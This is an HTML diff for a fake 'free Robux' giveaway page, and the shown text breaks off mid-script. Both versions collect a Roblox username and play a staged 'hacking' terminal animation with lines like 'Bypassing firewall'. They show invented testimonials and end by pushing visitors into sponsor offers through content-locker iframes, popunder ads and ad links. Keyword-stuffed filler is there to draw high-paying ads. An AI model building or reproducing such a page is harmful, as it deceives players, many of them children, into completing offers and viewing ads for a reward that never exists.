@@ -3,580 +3,358 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Rewards - Get Your Robux!</title>
+    <title>Get Your Free Robux Today!</title>
     
-    <!-- SEO AND META TAGS -->
-    <meta name="description" content="Learn how to earn Robux and understand the value of digital assets in the gaming economy. Explore topics like digital finance, investment, cloud technology, and cybersecurity.">
-    <meta name="keywords" content="digital assets, gaming economy, finance, investment, technology, cloud computing, cybersecurity, online education, software engineering, data analytics, asset management, online transactions, Robux rewards">
-    
-    <meta property="og:title" content="Roblox Rewards - Get Your Free Robux!">
-    <meta property="og:description" content="The #1 place for Roblox fans to earn free Robux. Fast, safe, and easy.">
-    <meta property="og:image" content="https://cdn.prod.website-files.com/67329a5ebeec6bec4738e42f/6765e8af62cf64412d6c3f32_1milgiveaway1920x1080.png">
-    <meta property="og:url" content="https://your-website-url.com">
-    <meta name="twitter:card" content="summary_large_image">
-
     <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
     
-    <!-- Google Fonts: Poppins & Source Code Pro for terminal -->
+    <!-- Google Fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;900&family=Source+Code+Pro:wght@400;600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&family=Source+Code+Pro:wght@400;600&display=swap" rel="stylesheet">
     
-    <!-- Tone.js for Sound Effects -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/tone/14.7.77/Tone.js"></script>
-
+    <!-- Custom Styles & Theme Configuration -->
     <style>
-        /* Custom Styles */
         body {
             font-family: 'Poppins', sans-serif;
-            background-color: #1A1A1A;
-            color: #F5F5F5;
-            overflow-x: hidden;
+            background-color: #000;
+            background-image: linear-gradient(315deg, #1e0000 0%, #000000 74%);
+            animation: gradient-animation 20s ease infinite;
+            background-size: 400% 400%;
         }
 
-        /* Custom gradient and glow for buttons */
-        .btn-primary {
-            background-image: linear-gradient(to right, #6C00FF, #CFFF04);
-            transition: all 0.3s ease;
-            box-shadow: 0 0 15px #CFFF04, 0 0 5px #6C00FF;
-        }
-        .btn-primary:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 0 25px #CFFF04, 0 0 10px #6C00FF;
-        }
-        .btn-primary:disabled {
-            background-image: linear-gradient(to right, #555, #777);
-            box-shadow: none;
-            cursor: not-allowed;
-            transform: none;
+        @keyframes gradient-animation {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
         }
 
-        /* Ripple effect for buttons */
-        .ripple {
-            position: absolute;
-            border-radius: 50%;
-            background: rgba(255, 255, 255, 0.6);
-            transform: scale(0);
-            animation: ripple-animation 0.6s linear;
-        }
-        @keyframes ripple-animation {
-            to {
-                transform: scale(4);
-                opacity: 0;
-            }
-        }
-        
-        /* Glowing card effect */
-        .glowing-card {
-            background-color: rgba(42, 42, 42, 0.8);
-            border: 2px solid #6C00FF;
-            box-shadow: 0 0 15px rgba(108, 0, 255, 0.5);
-            transition: all 0.3s ease;
-            width: 100%;
-        }
-        .glowing-card:hover {
-            transform: translateY(-5px) scale(1.02);
-            box-shadow: 0 0 25px rgba(108, 0, 255, 0.8), 0 0 10px #CFFF04;
-        }
-        
-        /* Style for the selected card */
-        .selected-card {
-            border-color: #CFFF04;
-            transform: scale(1.05) !important;
-            box-shadow: 0 0 30px #CFFF04, 0 0 15px #6C00FF !important;
-        }
-        
-        /* Subtle background particle animation */
-        @keyframes animate-particles {
-            0% { transform: translateY(0); opacity: 1; }
-            100% { transform: translateY(-100vh); opacity: 0; }
-        }
-        .particle {
-            position: absolute;
-            border-radius: 50%;
-            background: #6C00FF;
-            animation: animate-particles 25s linear infinite;
-        }
-        
-        /* Sparkle animation for footer badge */
-        @keyframes sparkle-animation {
-            0%, 100% { transform: scale(1); opacity: 0.7; }
-            50% { transform: scale(1.5); opacity: 1; }
-        }
-        .sparkle {
-            animation: sparkle-animation 1.5s infinite;
-        }
-
-        /* Step-by-step guide styles */
-        .step-card {
-            background-color: rgba(42, 42, 42, 0.5);
-            border: 1px solid #6C00FF;
-            backdrop-filter: blur(5px);
-        }
-        .step-number {
-            color: #CFFF04;
-            font-weight: 900;
-        }
-
-        /* Terminal Simulation Styles */
-        #terminal-section {
+        .font-source-code {
             font-family: 'Source Code Pro', monospace;
-            background-color: #0D0D0D;
-            border: 1px solid #6C00FF;
-            box-shadow: 0 0 20px rgba(108, 0, 255, 0.4);
         }
-        #terminal-output p {
-            margin: 0;
-            white-space: pre-wrap;
-            line-height: 1.5;
-        }
-        #terminal-output .success {
-            color: #CFFF04;
-        }
-        #terminal-output .info {
-            color: #A0A0A0;
-        }
-        .blinking-cursor {
+        
+        .terminal-cursor {
             display: inline-block;
-            width: 10px;
-            height: 1.2em;
-            background-color: #CFFF04;
+            background-color: #ef4444; /* red-500 */
+            margin-left: 2px;
             animation: blink 1s step-end infinite;
-            vertical-align: bottom;
         }
+
         @keyframes blink {
-            50% { opacity: 0; }
+            from, to { background-color: transparent }
+            50% { background-color: #ef4444; } /* red-500 */
         }
+        
+        .testimonial-carousel {
+            scroll-snap-type: x mandatory;
+            scroll-behavior: smooth;
+            -webkit-overflow-scrolling: touch;
+        }
+        
+        .testimonial-card {
+            scroll-snap-align: start;
+        }
+
+        .glowing-shadow {
+             box-shadow: 0 0 5px #ef4444, 0 0 10px #ef4444, 0 0 15px #ef4444;
+        }
+        
+        .reward-card:hover {
+            transform: translateY(-5px) scale(1.02);
+            box-shadow: 0 0 8px rgba(239, 68, 68, 0.6), 0 0 20px rgba(239, 68, 68, 0.4);
+        }
+
     </style>
-    <!-- Popunder Ad Code -->
+    
+    <!-- Popunder Ad Script -->
     <script type='text/javascript' src='//pl27674374.revenuecpmgate.com/2f/00/6e/2f006e1bdbffb539615eca0c19f82ea4.js'></script>
 </head>
-<body class="relative">
+<body class="bg-black text-white antialiased overflow-x-hidden">
 
-    <!-- Background Particles -->
-    <div id="particles-container" class="absolute top-0 left-0 w-full h-full overflow-hidden z-0"></div>
+    <!-- Verification Iframe Overlay (Initially Hidden) -->
+    <div id="verification-overlay" class="hidden fixed inset-0 bg-black bg-opacity-90 z-50 flex items-center justify-center">
+        <iframe src="https://installchecker.com/cl/i/1o468e" class="w-full h-full border-0"></iframe>
+    </div>
 
-    <!-- Sticky Header -->
-    <header class="sticky top-0 bg-[#1A1A1A]/80 backdrop-blur-sm shadow-lg shadow-[#6C00FF]/20 z-50">
-        <nav class="container mx-auto px-6 py-3 flex justify-between items-center">
-            <a href="#" class="text-2xl font-bold text-white">
-                <span class="text-[#CFFF04]">R</span>obux<span class="text-[#CFFF04]">R</span>ewards
-            </a>
-            <div class="hidden md:flex space-x-6 items-center">
-                <a href="#how-it-works" class="text-gray-300 hover:text-white transition-colors duration-300">How it Works</a>
-                <a href="#social-proof" class="text-gray-300 hover:text-white transition-colors duration-300">Testimonials</a>
-                <a href="#footer" class="text-gray-300 hover:text-white transition-colors duration-300">Support</a>
-            </div>
-        </nav>
-    </header>
+    <!-- Page 1: Username Entry -->
+    <main id="page1" class="min-h-screen flex flex-col items-center justify-center p-4 transition-opacity duration-500">
+        <div class="w-full max-w-4xl mx-auto">
+            <img src="https://cdn.prod.website-files.com/67329a5ebeec6bec4738e42f/6765e8af62cf64412d6c3f32_1milgiveaway1920x1080.png" alt="Robux Giveaway" class="rounded-lg shadow-2xl shadow-red-500/20 w-full object-cover mb-8">
 
-    <main class="relative z-10">
-        <!-- PAGE 1: Roblox Identity Simulation -->
-        <section id="page-1" class="flex flex-col">
-            <!-- Header Image -->
-            <div class="w-full h-64 md:h-80">
-                <img src="https://cdn.prod.website-files.com/67329a5ebeec6bec4738e42f/6765e8af62cf64412d6c3f32_1milgiveaway1920x1080.png" 
-                     alt="Roblox 1 Million Robux Giveaway"
-                     class="w-full h-full object-cover"
-                     onerror="this.onerror=null; this.src='https://placehold.co/1920x1080/1A1A1A/F5F5F5?text=Roblox+Giveaway';">
-            </div>
+            <div class="bg-gray-900/50 backdrop-blur-sm p-8 rounded-lg shadow-lg border border-gray-800 text-center">
+                <h1 class="text-3xl md:text-5xl font-bold mb-2 text-red-500">Claim Your Robux!</h1>
+                <p class="text-gray-300 mb-6 text-lg">Enter your Roblox username to connect your account.</p>
 
-            <!-- Username Input Section -->
-            <div class="container mx-auto p-6 flex flex-col items-center text-center -mt-24 md:-mt-32 z-20">
-                <div id="username-input-section" class="w-full max-w-lg bg-[#1A1A1A]/80 backdrop-blur-md p-8 rounded-2xl shadow-2xl shadow-black/50 border border-purple-500/30">
-                    <h1 class="text-3xl md:text-4xl font-black uppercase tracking-wider mb-2">
-                        <span class="text-[#CFFF04]">Earn Free</span> Robux
-                    </h1>
-                    <p class="text-md text-gray-300 mb-6">Enter your username to begin.</p>
-                    <form id="username-form" class="w-full">
-                        <div class="flex flex-col items-center gap-4">
-                            <input type="text" id="roblox-username" placeholder="Enter Your Roblox Username" class="w-full text-center text-lg px-4 py-3 rounded-lg bg-[#2A2A2A] border-2 border-[#6C00FF] focus:outline-none focus:ring-2 focus:ring-[#CFFF04] text-white transition-all duration-300">
-                            <button type="submit" class="btn-primary relative overflow-hidden w-full text-black font-bold text-lg px-8 py-3 rounded-lg whitespace-nowrap">
-                                Get Started
-                            </button>
-                        </div>
-                    </form>
-                </div>
-                
-                <!-- Terminal Section -->
-                <div id="terminal-section" class="hidden w-full max-w-lg mt-6 p-4 rounded-lg text-left text-sm">
-                    <div id="terminal-output"></div>
+                <form id="username-form" class="w-full max-w-md mx-auto">
+                    <input type="text" id="roblox-username" placeholder="Enter your Roblox username" class="w-full bg-gray-900 text-white border-2 border-red-500 rounded-md px-4 py-3 text-lg focus:outline-none focus:ring-2 focus:ring-red-400 transition mb-4" required>
+                    <button type="submit" class="w-full bg-red-600 text-white font-bold py-3 px-6 rounded-md text-lg hover:bg-red-700 transition-transform transform hover:scale-105 duration-300 shadow-lg shadow-red-500/30">
+                        Connect Account
+                    </button>
+                </form>
+
+                <div id="terminal" class="hidden mt-6 bg-black text-left p-4 rounded-md border border-gray-700 w-full max-w-md mx-auto font-source-code text-sm md:text-base">
+                    <div id="terminal-output" class="whitespace-pre-wrap"></div>
                 </div>
             </div>
+        </div>
+    </main>
+
+    <!-- Page 2: Reward Selection -->
+    <main id="page2" class="hidden p-4 md:p-8">
+        <div class="max-w-5xl mx-auto">
+            <header class="text-center mb-12">
+                <h1 class="text-4xl md:text-6xl font-bold mb-2">
+                    <span class="text-red-500">Success!</span> Account Connected.
+                </h1>
+                <p class="text-gray-300 text-xl">Choose your Robux reward below to complete the final step.</p>
+            </header>
             
-            <!-- How it Works Section -->
-            <section id="how-it-works" class="container mx-auto px-6 py-24 text-center">
-                <h2 class="text-3xl md:text-4xl font-bold mb-12">How It Works in 3 Simple Steps</h2>
-                <div class="grid grid-cols-1 md:grid-cols-3 gap-8 max-w-4xl mx-auto">
-                    <!-- Step 1 -->
-                    <div class="step-card p-6 rounded-xl">
-                        <div class="step-number text-5xl mb-4">1</div>
-                        <h3 class="text-xl font-bold mb-2">Enter Username</h3>
-                        <p class="text-gray-400">Type in your Roblox username so we know where to send the Robux.</p>
+            <!-- Banner Ad 320x50 -->
+            <div class="my-6 flex justify-center">
+                <script type="text/javascript">
+                    atOptions = {
+                        'key' : '5529ada056a56fa9089646a710fd437f',
+                        'format' : 'iframe',
+                        'height' : 50,
+                        'width' : 320,
+                        'params' : {}
+                    };
+                </script>
+                <script type="text/javascript" src="//www.highperformanceformat.com/5529ada056a56fa9089646a710fd437f/invoke.js"></script>
+            </div>
+
+            <!-- Reward Cards -->
+            <section class="mb-16">
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                    <!-- Reward Card Template -->
+                    <div class="reward-card bg-gray-900 rounded-lg p-4 border-2 border-gray-800 hover:border-red-500 transition-all duration-300 cursor-pointer flex items-center space-x-4">
+                        <img src="https://i.postimg.cc/j5MGQNMQ/il-fullxfull-6819700938-868m.jpg" alt="Robux Coin" class="w-16 h-16 rounded-full flex-shrink-0">
+                        <div class="flex-grow text-left">
+                            <h3 class="text-2xl font-bold text-white">400</h3>
+                            <p class="text-gray-400">Robux</p>
+                        </div>
+                        <span class="text-2xl font-bold text-red-500">&rsaquo;</span>
                     </div>
-                    <!-- Step 2 -->
-                    <div class="step-card p-6 rounded-xl">
-                        <div class="step-number text-5xl mb-4">2</div>
-                        <h3 class="text-xl font-bold mb-2">Choose Reward</h3>
-                        <p class="text-gray-400">Select the amount of Robux you want to earn from the available options.</p>
+                     <div class="reward-card bg-gray-900 rounded-lg p-4 border-2 border-gray-800 hover:border-red-500 transition-all duration-300 cursor-pointer flex items-center space-x-4">
+                        <img src="https://i.postimg.cc/j5MGQNMQ/il-fullxfull-6819700938-868m.jpg" alt="Robux Coin" class="w-16 h-16 rounded-full flex-shrink-0">
+                        <div class="flex-grow text-left">
+                            <h3 class="text-2xl font-bold text-white">800</h3>
+                            <p class="text-gray-400">Robux</p>
+                        </div>
+                        <span class="text-2xl font-bold text-red-500">&rsaquo;</span>
                     </div>
-                    <!-- Step 3 -->
-                    <div class="step-card p-6 rounded-xl">
-                        <div class="step-number text-5xl mb-4">3</div>
-                        <h3 class="text-xl font-bold mb-2">Complete Offer</h3>
-                        <p class="text-gray-400">Finish one simple task from our sponsors to fund your reward. It's that easy!</p>
+                     <div class="reward-card bg-gray-900 rounded-lg p-4 border-2 border-gray-800 hover:border-red-500 transition-all duration-300 cursor-pointer flex items-center space-x-4">
+                        <img src="https://i.postimg.cc/j5MGQNMQ/il-fullxfull-6819700938-868m.jpg" alt="Robux Coin" class="w-16 h-16 rounded-full flex-shrink-0">
+                        <div class="flex-grow text-left">
+                            <h3 class="text-2xl font-bold text-white">2000</h3>
+                            <p class="text-gray-400">Robux</p>
+                        </div>
+                        <span class="text-2xl font-bold text-red-500">&rsaquo;</span>
+                    </div>
+                     <div class="reward-card bg-gray-900 rounded-lg p-4 border-2 border-gray-800 hover:border-red-500 transition-all duration-300 cursor-pointer flex items-center space-x-4">
+                        <img src="https://i.postimg.cc/j5MGQNMQ/il-fullxfull-6819700938-868m.jpg" alt="Robux Coin" class="w-16 h-16 rounded-full flex-shrink-0">
+                        <div class="flex-grow text-left">
+                            <h3 class="text-2xl font-bold text-white">4500</h3>
+                            <p class="text-gray-400">Robux</p>
+                        </div>
+                        <span class="text-2xl font-bold text-red-500">&rsaquo;</span>
                     </div>
                 </div>
             </section>
-        </section>
-
-        <!-- PAGE 2: Robux Reward Selection (hidden by default) -->
-        <section id="page-2" class="hidden container mx-auto p-6 flex flex-col justify-start items-center text-center py-16 md:py-24">
-            <h1 class="text-4xl md:text-6xl font-black uppercase tracking-wider mb-2">
-                Choose Your <span class="text-[#CFFF04]">Robux</span> Reward
-            </h1>
-            <p class="text-lg text-gray-300 mb-12">Select one of the rewards below to proceed.</p>
             
-            <div id="rewards" class="flex flex-col items-center gap-4 w-full max-w-md mx-auto">
-                <!-- Reward cards will be dynamically inserted here -->
+            <!-- Banner Ad 468x60 -->
+            <div class="my-10 flex justify-center">
+                 <script type="text/javascript">
+                    atOptions = {
+                        'key' : 'a3d753b4c8750b81934a702fa7c1f236',
+                        'format' : 'iframe',
+                        'height' : 60,
+                        'width' : 468,
+                        'params' : {}
+                    };
+                </script>
+                <script type="text/javascript" src="//www.highperformanceformat.com/a3d753b4c8750b81934a702fa7c1f236/invoke.js"></script>
             </div>
-            
-            <button id="confirm-selection-btn" disabled class="btn-primary relative overflow-hidden w-full max-w-md text-black font-bold text-lg px-8 py-4 rounded-lg mt-8">
-                Confirm Reward
-            </button>
-        </section>
-        
-        <!-- Ad Slot: Banner 320x50 -->
-        <div class="my-8 flex justify-center">
-            <script type="text/javascript">
-                atOptions = {
-                    'key' : '5529ada056a56fa9089646a710fd437f',
-                    'format' : 'iframe',
-                    'height' : 50,
-                    'width' : 320,
-                    'params' : {}
-                };
-            </script>
-            <script type="text/javascript" src="//www.highperformanceformat.com/5529ada056a56fa9089646a710fd437f/invoke.js"></script>
-        </div>
 
-
-        <!-- Social Proof Section -->
-        <section id="social-proof" class="py-16 bg-[#2A2A2A]/50">
-            <div class="container mx-auto px-6 text-center">
-                <div class="mb-12">
-                    <h3 class="text-3xl font-bold">Join Thousands of Happy Players!</h3>
-                    <div class="mt-2 text-xl text-[#CFFF04] font-semibold">
-                        <span class="animate-pulse">🔴</span> Currently Online: <span id="online-counter">9,823</span> users
+            <!-- How It Works Section -->
+            <section class="mb-16 bg-gray-900/50 backdrop-blur-sm p-8 rounded-lg border border-gray-800">
+                <h2 class="text-3xl font-bold text-center mb-8 text-red-500">How It Works</h2>
+                <div class="grid md:grid-cols-3 gap-8 text-center">
+                    <div class="flex flex-col items-center">
+                        <div class="bg-red-600 text-white rounded-full w-16 h-16 flex items-center justify-center text-2xl font-bold mb-4 shadow-lg shadow-red-500/30">1</div>
+                        <h3 class="text-xl font-semibold mb-2">Enter Username</h3>
+                        <p class="text-gray-400">Type in your Roblox username to link your account to our reward system.</p>
+                    </div>
+                    <div class="flex flex-col items-center">
+                        <div class="bg-red-600 text-white rounded-full w-16 h-16 flex items-center justify-center text-2xl font-bold mb-4 shadow-lg shadow-red-500/30">2</div>
+                        <h3 class="text-xl font-semibold mb-2">Choose Reward</h3>
+                        <p class="text-gray-400">Select the amount of Robux you want to receive from the available options.</p>
+                    </div>
+                    <div class="flex flex-col items-center">
+                        <div class="bg-red-600 text-white rounded-full w-16 h-16 flex items-center justify-center text-2xl font-bold mb-4 shadow-lg shadow-red-500/30">3</div>
+                        <h3 class="text-xl font-semibold mb-2">Verify & Claim</h3>
+                        <p class="text-gray-400">Complete a quick verification step with our sponsors to finalize your claim and receive your Robux.</p>
                     </div>
                 </div>
-                <div id="testimonials-carousel" class="relative w-full max-w-3xl mx-auto h-48">
-                    <!-- Testimonials will be dynamically inserted here -->
+                 <div class="text-center mt-6">
+                    <a href="https://www.revenuecpmgate.com/pjp4c9ch?key=c2c4509508448c931b7e444f3242e955" class="text-red-500 hover:underline">Learn more from our sponsors!</a>
                 </div>
-            </div>
-        </section>
+            </section>
 
-        <!-- HIGH-CPM CONTENT SECTION -->
-        <section id="cpm-content" class="container mx-auto px-6 py-16 text-left">
-            <div class="max-w-4xl mx-auto">
-                <h2 class="text-3xl font-bold text-center mb-8">The Digital Gaming Economy</h2>
-                 <!-- Ad Slot: Banner 160x300 -->
-                <div class="my-8 float-right ml-4 hidden md:block">
-                    <script type="text/javascript">
-                        atOptions = {
-                            'key' : 'eb63b40811b0942503f6d1bac37272e4',
-                            'format' : 'iframe',
-                            'height' : 300,
-                            'width' : 160,
-                            'params' : {}
-                        };
-                    </script>
-                    <script type="text/javascript" src="//www.highperformanceformat.com/eb63b40811b0942503f6d1bac37272e4/invoke.js"></script>
+            <!-- Social Proof Section -->
+            <section class="mb-16">
+                <h2 class="text-3xl font-bold text-center mb-8 text-red-500">What Our Users Say</h2>
+                <div class="relative">
+                    <div id="carousel" class="testimonial-carousel flex overflow-x-auto pb-4 -mx-4 px-4">
+                        <!-- Testimonial 1 -->
+                        <div class="testimonial-card flex-shrink-0 w-full md:w-1/2 lg:w-1/3 px-4">
+                            <div class="bg-gray-900 p-6 rounded-lg border border-gray-800 h-full">
+                                <p class="text-gray-300 italic mb-4">"I thought this was fake at first but it actually worked! Got my 4500 Robux in like 10 minutes. So cool!"</p>
+                                <p class="font-bold text-red-400">- GamerPro123</p>
+                            </div>
+                        </div>
+                        <!-- Testimonial 2 -->
+                        <div class="testimonial-card flex-shrink-0 w-full md:w-1/2 lg:w-1/3 px-4">
+                            <div class="bg-gray-900 p-6 rounded-lg border border-gray-800 h-full">
+                                <p class="text-gray-300 italic mb-4">"Super easy process. Just followed the steps and the Robux showed up in my account. Will definitely use again."</p>
+                                <p class="font-bold text-red-400">- RobloxFanatic_X</p>
+                            </div>
+                        </div>
+                        <!-- Testimonial 3 -->
+                        <div class="testimonial-card flex-shrink-0 w-full md:w-1/2 lg:w-1/3 px-4">
+                           <div class="bg-gray-900 p-6 rounded-lg border border-gray-800 h-full">
+                                <p class="text-gray-300 italic mb-4">"Finally a site that delivers. The verification was quick and I got my reward instantly. 10/10"</p>
+                                <p class="font-bold text-red-400">- BloxMaster99</p>
+                            </div>
+                        </div>
+                         <!-- Testimonial 4 -->
+                        <div class="testimonial-card flex-shrink-0 w-full md:w-1/2 lg:w-1/3 px-4">
+                           <div class="bg-gray-900 p-6 rounded-lg border border-gray-800 h-full">
+                                <p class="text-gray-300 italic mb-4">"Was skeptical but my friend recommended it. It's legit! We both got Robux for our favorite games."</p>
+                                <p class="font-bold text-red-400">- AdoptMePlayer_YT</p>
+                            </div>
+                        </div>
+                    </div>
                 </div>
-                <div class="space-y-6 text-gray-300">
-                    <p>In the modern digital world, in-game currencies like Robux are more than just play money—they are a form of digital asset. Understanding their value is key. Many players now view their digital items as a form of investment, similar to collecting rare items or even stock trading. Managing these assets requires smart strategies, much like personal finance management. Platforms like Roblox have created a robust digital economy, offering lessons in asset valuation and secure online transactions.</p>
-                    <p>The technology that powers these massive gaming platforms is cutting-edge. It relies on powerful cloud computing infrastructure, sophisticated data analytics, and robust cybersecurity measures to protect millions of users. For those interested in a career in tech, this industry offers huge opportunities. Many top universities now offer online courses in game development, software engineering, and AI development, turning a passion for gaming into a lucrative career. Learning to code can be the first step towards a degree in information technology.</p>
-                </div>
-            </div>
-        </section>
-        
-        <!-- Ad Slot: Banner 468x60 -->
-        <div class="my-8 flex justify-center">
-             <script type="text/javascript">
-                atOptions = {
-                    'key' : 'a3d753b4c8750b81934a702fa7c1f236',
-                    'format' : 'iframe',
-                    'height' : 60,
-                    'width' : 468,
-                    'params' : {}
-                };
-            </script>
-            <script type="text/javascript" src="//www.highperformanceformat.com/a3d753b4c8750b81934a702fa7c1f236/invoke.js"></script>
+            </section>
+
+            <!-- Digital Gaming Economy Section -->
+            <section class="bg-gray-900/50 backdrop-blur-sm p-8 rounded-lg border border-gray-800">
+                 <h2 class="text-3xl font-bold text-center mb-4 text-red-500">The Future of Gaming</h2>
+                 <p class="text-gray-400 text-center max-w-3xl mx-auto">
+                    The modern digital gaming economy is evolving rapidly. Platforms like Roblox are at the forefront, creating ecosystems where <strong class="text-red-400">digital assets</strong> hold real value. This transformation represents a significant <strong class="text-red-400">investment</strong> in virtual worlds, all powered by robust <strong class="text-red-400">cloud computing</strong> infrastructure. Ensuring the safety of these assets requires top-tier <strong class="text-red-400">cybersecurity</strong> measures, protecting players and creators alike in this new frontier.
+                 </p>
+            </section>
+            
+            <footer class="text-center mt-12 py-6 border-t border-gray-800">
+                <p class="text-gray-500">&copy; 2025 Robux Rewards. All rights reserved.</p>
+                <p class="text-gray-500 mt-2">
+                    <a href="https://www.revenuecpmgate.com/pjp4c9ch?key=c2c4509508448c931b7e444f3242e955" class="hover:text-red-500 transition">Our Partners</a> | 
+                    <a href="https://www.revenuecpmgate.com/pjp4c9ch?key=c2c4509508448c931b7e444f3242e955" class="hover:text-red-500 transition">Privacy Policy</a>
+                </p>
+            </footer>
+
         </div>
     </main>
     
-    <!-- Footer -->
-    <footer id="footer" class="bg-black/50 py-8">
-        <div class="container mx-auto px-6 text-center text-gray-400">
-            <div class="flex justify-center items-center gap-2 mb-4">
-                <span class="sparkle text-2xl text-[#CFFF04]">✨</span>
-                <p class="font-bold text-lg text-white">Made for Roblox fans</p>
-                <span class="sparkle text-2xl text-[#CFFF04]" style="animation-delay: 0.5s;">✨</span>
-            </div>
-            <div class="flex justify-center gap-6 mb-4">
-                <a href="#" class="hover:text-white transition-colors">Terms of Service</a>
-                <a href="#" class="hover:text-white transition-colors">Privacy Policy</a>
-                <a href="#" class="hover:text-white transition-colors">Support</a>
-            </div>
-            <p class="text-sm">&copy; 2024 RobuxRewards. All rights reserved. Not affiliated with Roblox Corporation.</p>
-        </div>
-    </footer>
-
-    <!-- Modal Popup (hidden by default) -->
-    <div id="task-modal" class="hidden fixed inset-0 bg-black/80 flex justify-center items-center z-50 p-4">
-        <div class="bg-[#1A1A1A] max-w-lg w-full p-8 rounded-2xl shadow-2xl shadow-[#6C00FF]/50 border-2 border-[#6C00FF] text-center relative animate-fade-in">
-            <button id="close-modal" class="absolute top-4 right-4 text-gray-400 hover:text-white text-2xl">&times;</button>
-            <h2 class="text-3xl font-bold text-[#CFFF04] mb-4">Final Step: Sponsor Verification</h2>
-            <p class="text-lg text-white">To receive your free Robux, our sponsors require you to complete one simple offer.</p>
-            <p class="text-gray-300 mt-2">This is how we are able to fund the Robux for everyone. Once you complete an offer, your reward will be sent to your account instantly!</p>
-            <!-- CPA Link -->
-            <a href="https://lockedapp.net/cl/i/1o468e" target="_blank" rel="noopener noreferrer" class="block mt-6">
-                <button class="btn-primary relative overflow-hidden w-full text-black font-bold text-lg px-8 py-3 rounded-lg">
-                    Complete an Offer
-                </button>
-            </a>
-        </div>
-    </div>
-
+    <!-- Main Application Logic -->
     <script>
-        document.addEventListener('DOMContentLoaded', () => {
-            // --- Sound Engine ---
-            const synth = new Tone.Synth().toDestination();
-            const playClickSound = () => synth.triggerAttackRelease("C4", "8n");
-            const playSuccessSound = () => {
-                const successSynth = new Tone.PluckSynth().toDestination();
-                successSynth.triggerAttack("G4", Tone.now());
-            }
+        const usernameForm = document.getElementById('username-form');
+        const terminal = document.getElementById('terminal');
+        const terminalOutput = document.getElementById('terminal-output');
+        const page1 = document.getElementById('page1');
+        const page2 = document.getElementById('page2');
+        const rewardCards = document.querySelectorAll('.reward-card');
+        const verificationOverlay = document.getElementById('verification-overlay');
 
-            // --- Page Elements ---
-            const page1 = document.getElementById('page-1');
-            const page2 = document.getElementById('page-2');
-            const usernameForm = document.getElementById('username-form');
-            const usernameInput = document.getElementById('roblox-username');
-            const usernameInputSection = document.getElementById('username-input-section');
-            const terminalSection = document.getElementById('terminal-section');
-            const terminalOutput = document.getElementById('terminal-output');
-
-            const rewardsContainer = document.getElementById('rewards');
-            const confirmSelectionBtn = document.getElementById('confirm-selection-btn');
-            const taskModal = document.getElementById('task-modal');
-            const closeModalBtn = document.getElementById('close-modal');
-
-            // --- Ripple Effect for Buttons ---
-            function createRipple(event) {
-                const button = event.currentTarget;
-                if (button.disabled) return;
-                const circle = document.createElement("span");
-                const diameter = Math.max(button.clientWidth, button.clientHeight);
-                const radius = diameter / 2;
-
-                circle.style.width = circle.style.height = `${diameter}px`;
-                circle.style.left = `${event.clientX - (button.getBoundingClientRect().left + radius)}px`;
-                circle.style.top = `${event.clientY - (button.getBoundingClientRect().top + radius)}px`;
-                circle.classList.add("ripple");
-
-                const ripple = button.getElementsByClassName("ripple")[0];
-                if (ripple) {
-                    ripple.remove();
+        // Function to simulate typing in the terminal
+        function typeWriter(element, text, i, callback) {
+            if (i < text.length) {
+                element.innerHTML = text.substring(0, i + 1) + '<span class="terminal-cursor"></span>';
+                setTimeout(() => typeWriter(element, text, i + 1, callback), 25); // Faster typing speed
+            } else {
+                element.innerHTML = text; // Remove cursor when done
+                if (callback) {
+                    setTimeout(callback, 200); // Faster delay before next step
                 }
-                button.appendChild(circle);
             }
+        }
+        
+        // Function to add a new line to the terminal
+        function addTerminalLine(text, callback) {
+            const line = document.createElement('div');
+            terminalOutput.appendChild(line);
+            typeWriter(line, text, 0, callback);
+        }
+
+        // Handle username form submission
+        usernameForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const username = document.getElementById('roblox-username').value;
+            usernameForm.classList.add('hidden');
+            terminal.classList.remove('hidden');
+
+            const messages = [
+                `> Initializing connection for player: ${username}...`,
+                '> Bypassing firewall... [OK]',
+                '> Establishing secure connection... [OK]',
+                '> Searching player database...',
+                '> Player found. Account verified.',
+                '> Success! Preparing reward selection...'
+            ];
             
-            document.querySelectorAll('.btn-primary').forEach(button => {
-                button.addEventListener("click", createRipple);
-            });
-
-
-            // --- Username Form Submission & Terminal Simulation ---
-            usernameForm.addEventListener('submit', (e) => {
-                e.preventDefault();
-                const username = usernameInput.value.trim();
-                if (!username) {
-                    // Add some shake animation for feedback
-                    usernameInput.classList.add('animate-shake');
-                    setTimeout(() => usernameInput.classList.remove('animate-shake'), 500);
-                    return;
-                }
-                playClickSound();
-                usernameInputSection.classList.add('hidden');
-                terminalSection.classList.remove('hidden');
-                
-                // Simulate terminal output
-                const terminalLines = [
-                    { text: `> Initializing connection for user: ${username}...`, delay: 500 },
-                    { text: `> Validating user ID...`, delay: 1000 },
-                    { text: `<span class="success">> User ID validated successfully.</span>`, delay: 1500 },
-                    { text: `> Fetching available reward packages...`, delay: 2000 },
-                    { text: `<span class="info">> Found 4 reward packages.</span>`, delay: 2500 },
-                    { text: `<span class="success">> Redirecting to reward selection...</span>`, delay: 3000 }
-                ];
-
-                let lineIndex = 0;
-                function printLine() {
-                    if (lineIndex < terminalLines.length) {
-                        const line = terminalLines[lineIndex];
+            let messageIndex = 0;
+            function showNextMessage() {
+                if(messageIndex < messages.length) {
+                    addTerminalLine(messages[messageIndex], showNextMessage);
+                    messageIndex++;
+                } else {
+                    // All messages displayed, transition to page 2
+                    setTimeout(() => {
+                        page1.classList.add('opacity-0');
                         setTimeout(() => {
-                            terminalOutput.innerHTML += `<p>${line.text}</p>`;
-                            terminalOutput.scrollTop = terminalOutput.scrollHeight;
-                            if (lineIndex === terminalLines.length - 1) {
-                                terminalOutput.innerHTML += `<span class="blinking-cursor"></span>`;
-                                // Transition to page 2
-                                setTimeout(() => {
-                                    playSuccessSound();
-                                    page1.classList.add('hidden');
